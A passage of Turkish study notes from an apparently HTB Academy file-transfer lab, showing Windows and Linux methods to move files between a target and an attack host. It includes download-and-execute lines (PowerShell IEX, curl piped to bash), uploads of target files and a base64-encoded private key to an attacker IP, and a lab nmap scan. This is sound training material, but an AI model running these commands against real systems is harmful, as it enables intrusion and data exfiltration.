Daha sonra 21 numaralı portu belirtebiliriz çünkü pyftpdlib varsayılan olarak 2121 numaralı portu kullanır. Eğer bir kullanıcı ve parola belirlemezsek, anonim kimlik doğrulama varsayılan olarak etkinleştirilir.


#### Setting up a Python3 FTP Server
```shell-session
$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
FTP sunucusu kurulduktan sonra, Windows'un önceden yüklenmiş FTP istemcisini veya PowerShell Net.WebClient'ı kullanarak dosya aktarımlarını gerçekleştirebiliriz.


### PowerShell Kullanarak FTP Sunucusundan Dosya Aktarma

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
Uzak bir makinede bir shell aldığımızda, etkileşimli bir shell'imiz olmayabilir. Bu durumda, bir dosyayı indirmek için bir FTP komut dosyası oluşturabiliriz. Öncelikle, çalıştırmak istediğimiz komutları içeren bir dosya oluşturmamız ve ardından bu dosyayı indirmek için bu dosyayı kullanmak üzere FTP istemcisini kullanmamız gerekir.


### FTP Client için bir Komut Dosyası Oluşturun ve Hedef Dosyayı İndirin

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


### Upload Operations
Şifre kırma, analiz, exfiltrasyon gibi hedef makinemizden saldırı hostumuza dosya yüklememiz gereken durumlar da vardır. Download işlemi için kullandığımız yöntemleri şimdi upload işlemi için de kullanabiliriz. Çeşitli yollarla dosya yükleme işlemini nasıl gerçekleştirebileceğimizi görelim.


## PowerShell Base64 Encode & Decode
Powershell kullanarak bir base64 dizesinin kodunu nasıl çözeceğimizi gördük. Şimdi, ters işlemi yapalım ve bir dosyayı kodlayalım, böylece saldırı hostumuzda kodunu çözebiliriz.


### Encode File Using PowerShell
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
Bu içeriği kopyalayıp saldırı hostumuza yapıştırıyoruz, kodu çözmek için ==base64== komutunu kullanıyoruz ve aktarımın doğru bir şekilde gerçekleştiğini doğrulamak için ==md5sum== uygulamasını kullanıyoruz.

#### Decode Base64 String in Linux
```shell-session
$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

```shell-session
M1R4CKCK@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```


## PowerShell Web Uploads
PowerShell'in yükleme işlemleri için built-in bir fonksiyonu yoktur, ancak yükleme fonksiyonumuzu oluşturmak için ==Invoke-WebRequest== veya ==Invoke-RestMethod'==u kullanabiliriz. Ayrıca, çoğu yaygın web sunucusu yardımcı programında varsayılan bir seçenek olmayan yüklemeleri kabul eden bir web sunucusuna da ihtiyacımız olacak.

Web sunucumuz için, bir dosya yükleme sayfası içeren Python [HTTP.server](https://docs.python.org/3/library/http.server.html) modülünün genişletilmiş bir modülü olan [uploadserver](https://github.com/Densaugeo/uploadserver)'ı kullanabiliriz. Hadi kuralım ve web sunucusunu başlatalım.


### Upload ile Yapılandırılmış Web Server Kurulumu
```shell-session
M1R4CKCK@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```shell-session
M1R4CKCK@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Şimdi yükleme işlemlerini gerçekleştirmek için Invoke-RestMethod kullanan [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) PowerShell script'ini kullanabiliriz. Script, dosya yolunu belirtmek için kullandığımız -File ve dosyamızı yükleyeceğimiz sunucu URL'si olan -Uri olmak üzere iki parametre kabul eder. Host dosyasını Windows host'umuzdan yüklemeyi deneyelim.


### Python Upload Server'a Dosya Yüklemek için PowerShell Script
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```


### PowerShell Base64 Web Upload
Upload işlemleri için PowerShell ve base64 kodlu dosyaları kullanmanın bir diğer yolu da Netcat ile birlikte ==Invoke-WebRequest== veya ==Invoke-RestMethod== kullanmaktır. Netcat'i belirlediğimiz bir portu dinlemek ve dosyayı POST isteği olarak göndermek için kullanırız. Son olarak, çıktıyı kopyalıyoruz ve base64 stringini bir dosyaya dönüştürmek için base64 decode fonksiyonunu kullanıyoruz.
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
Netcat ile base64 verisini yakalıyoruz ve stringi dosyaya dönüştürmek için decode seçeneği ile base64 uygulamasını kullanıyoruz.

```shell-session
M1R4CKCK@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

```shell-session
M1R4CKCK@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```


## SMB Uploads
Şirketlerin genellikle HTTP (TCP/80) ve HTTPS (TCP/443) protokollerini kullanarak giden trafiğe izin verdiğini daha önce tartışmıştık. Genellikle kurumlar SMB protokolünün (TCP/445) iç ağlarından çıkmasına izin vermezler çünkü bu onları potansiyel saldırılara açık hale getirebilir. Bu konuda daha fazla bilgi için Microsoft'un SMB trafiğinin yan bağlantılardan ve ağa girip çıkmasını önleme [yazısını](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a) okuyabiliriz.

Bir alternatif de WebDav ile HTTP üzerinden SMB çalıştırmaktır. WebDAV ([RFC 4918](https://datatracker.ietf.org/doc/html/rfc4918)), web tarayıcılarının ve web sunucularının birbirleriyle iletişim kurmak için kullandıkları internet protokolü olan HTTP'nin bir uzantısıdır. WebDAV protokolü, bir web sunucusunun bir dosya sunucusu gibi davranmasını sağlayarak işbirliğine dayalı içerik yazımını destekler. WebDAV HTTPS de kullanabilir.

SMB kullandığınızda, önce SMB protokolünü kullanarak bağlanmayı dener ve kullanılabilir bir SMB paylaşımı yoksa HTTP kullanarak bağlanmayı dener. Aşağıdaki Wireshark yakalamasında, testing3 dosya paylaşımına bağlanmaya çalışıyoruz ve SMB ile bir şey bulamadığı için HTTP kullanıyor.
![Pasted image 20241017221328.png](/img/user/resimler/Pasted%20image%2020241017221328.png)


#### Configuring WebDav Server
WebDav sunucumuzu kurmak için, wsgidav ve cheroot adlı iki Python modülünü kurmamız gerekiyor (bu uygulama hakkında daha fazla bilgiyi buradan okuyabilirsiniz: [wsgidav github](https://github.com/mar10/wsgidav)). Bunları yükledikten sonra, hedef dizinde wsgidav uygulamasını çalıştırıyoruz.


### WebDav Python modüllerini yükleme
```shell-session
M1R4CKCK@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

#### Using the WebDav Python module
```shell-session
M1R4CKCK@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```


#### Connecting to the Webdav Share
Şimdi DavWWRoot dizinini kullanarak paylaşıma bağlanmayı deneyebiliriz.
```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```
Not: DavWWRoot, Windows Shell tarafından tanınan özel bir anahtar sözcüktür. WebDAV sunucunuzda böyle bir klasör yoktur. DavWWRoot anahtar sözcüğü, WebDAV isteklerini işleyen Mini-Redirector sürücüsüne WebDAV sunucusunun root'una bağlandığınızı söyler.

Sunucuya bağlanırken sunucunuzda var olan bir klasörü belirtirseniz bu anahtar sözcüğü kullanmaktan kaçınabilirsiniz. Örneğin: \192.168.49.128\sharefolder


### SMB Kullanarak Dosya Yükleme
```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
Not: SMB (TCP/445) kısıtlamaları yoksa, impacket-smbserver'ı indirme işlemleri için ayarladığımız şekilde kullanabilirsiniz.


## FTP Uploads
FTP kullanarak dosya yüklemek, dosya indirmeye çok benzer. İşlemi tamamlamak için PowerShell veya FTP client kullanabiliriz. Python modülü pyftpdlib'i kullanarak FTP Sunucumuzu başlatmadan önce, client'ların saldırı hostumuza dosya yüklemesine izin vermek için --write seçeneğini belirtmemiz gerekir.

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
Şimdi FTP Sunucumuza bir dosya yüklemek için PowerShell upload fonksiyonunu kullanalım.

#### PowerShell Upload File
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### FTP Client'ın File Upload Etmesi için Komut Dosyası Oluşturma
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```


## Özet
Windows lokal araçlarını kullanarak dosya indirmek ve yüklemek için birkaç yöntemden bahsettik, ancak daha fazlası da var. İlerleyen bölümlerde, dosya aktarım işlemlerini gerçekleştirmek için kullanabileceğimiz diğer mekanizmaları ve araçları tartışacağız.



Çözüm :

Potansiyel yol olarak 21,80,445 yani ftp http smb ile upload edebiliriz. . 

```cmd-session
$ sudo nmap -p- 10.129.201.55 --min-rate 10000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 17:46 CDT
Nmap scan report for 10.129.201.55
Host is up (0.081s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

```

impacket-smbserver ile server oluşturup indirme işlemini yapabilirsiniz .



## Linux File Transfer Methods


## **Base64 Kodlama / Kod Çözme**  

Aktarmak istediğimiz dosya boyutuna bağlı olarak ağ iletişimi gerektirmeyen bir yöntem kullanabiliriz. Bir terminale erişimimiz varsa, bir dosyayı base64 stringine kodlayabilir, içeriğini terminale kopyalayabilir ve ters işlemi gerçekleştirebiliriz. Bunu Bash ile nasıl yapabileceğimizi görelim.


#### Check File MD5 hash

```shell-session
M1R4CKCK@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Dosya içeriğini yazdırmak için `cat` kullanıyoruz ve çıktıyı bir pipe `|` kullanarak base64 kodluyoruz. Sadece bir satır oluşturmak için `-w 0` seçeneğini kullandık ve yeni bir satır başlatmak ve kopyalamayı kolaylaştırmak için komutu noktalı virgül (;) ve `echo` anahtar sözcüğü ile sonlandırdık.

#### Encode SSH Key to Base64

```shell-session
M1R4CKCK@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Bu içeriği kopyalıyoruz, Linux hedef makinemize yapıştırıyoruz ve deşifre etmek için `-d' seçeneğiyle `base64` kullanıyoruz.


#### **Linux - Decode the File**

```shell-session
M1R4CKCK@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Son olarak, `md5sum` komutunu kullanarak dosyanın başarıyla aktarılıp aktarılmadığını doğrulayabiliriz.


#### Linux - Confirm the MD5 Hashes Match

```shell-session
M1R4CKCK@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Not:** Ters işlemi kullanarak da dosya yükleyebilirsiniz. Ele geçirilmiş hedefinizden bir dosyayı cat ve base64 ile kodlayın ve Pwnbox'ınızda kodunu çözün.


## **Wget ve cURL ile Web İndirmeleri**

Linux dağıtımlarında web uygulamaları ile etkileşim için kullanılan en yaygın iki araç `wget` ve `curl`' `dür`. Bu araçlar birçok Linux dağıtımında yüklüdür.  

`Wget` kullanarak bir dosya indirmek için URL'yi ve çıktı dosya adını ayarlamak için `-O' seçeneğini belirtmemiz gerekir.


#### **wget Kullanarak Dosya İndirme**

```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL`, `wget`'e çok benzer, ancak çıktı dosya adı seçeneği küçük `-o' harfidir.


#### **cURL Kullanarak Dosya İndirme**

```shell-session
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


## Fileless Attacks Using Linux

Linux'un çalışma şekli ve [pipe'ların](https://www.geeksforgeeks.org/piping-in-unix-or-linux/) işleyişi nedeniyle, Linux'ta kullandığımız araçların çoğu fileless işlemleri çoğaltmak için kullanılabilir, bu da çalıştırmak için bir dosya indirmek zorunda olmadığımız anlamına gelir.

**Not:** `mkfifo` gibi bazı payloadlar diske dosya yazar. Bir pipe kullandığınızda payload'un yürütülmesi filesiz olsa da, seçilen payload'a bağlı olarak OS üzerinde geçici dosyalar oluşturabileceğini unutmayın.

Kullandığımız `cURL` komutunu alalım ve LinEnum.sh dosyasını indirmek yerine bir pipe kullanarak doğrudan çalıştıralım.


#### Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Benzer şekilde, bir Python script dosyasını bir web sunucusundan indirebilir ve Python binary'sine aktarabiliriz. Bunu bu sefer `wget` kullanarak yapalım.

#### Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```


## **Bash ile indirme (/dev/tcp)**
İyi bilinen dosya aktarım araçlarından hiçbirinin kullanılamadığı durumlar da olabilir. Bash sürüm 2.04 veya üzeri yüklü olduğu sürece (--enable-net-redirections ile derlenmiş), yerleşik /dev/TCP aygıt dosyası basit dosya indirmeleri için kullanılabilir.

#### **Hedef Web Sunucusuna Bağlanın**

```shell-session
$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
$ cat <&3
```


## SSH Downloads
SSH (veya Secure Shell) remote bilgisayarlara güvenli erişim sağlayan bir protokoldür. SSH uygulaması, varsayılan olarak SSH protokolünü kullanan uzak dosya aktarımı için bir `SCP` yardımcı programıyla birlikte gelir.  

`SCP` (güvenli kopya), iki host arasında dosya ve dizinleri güvenli bir şekilde kopyalamanızı sağlayan bir komut satırı yardımcı programıdır. Dosyalarımızı lokalden remote sunuculara ve remote sunuculardan lokal makinemize kopyalayabiliriz.  

`SCP`, `copy` veya `cp`'ye çok benzer, ancak lokal bir yol sağlamak yerine, bir kullanıcı adı, uzak IP adresi veya DNS adı ve kullanıcının kimlik bilgilerini belirtmemiz gerekir.  

Hedef Linux makinemizden Pwnbox'ımıza dosya indirmeye başlamadan önce, Pwnbox'ımızda bir SSH sunucusu kuralım.


#### **SSH Sunucusunu Etkinleştirme**

```shell-session
sudo systemctl enable ssh
```

#### Starting the SSH Server

```shell-session
$ sudo systemctl start ssh
```


#### Checking for SSH Listening Port

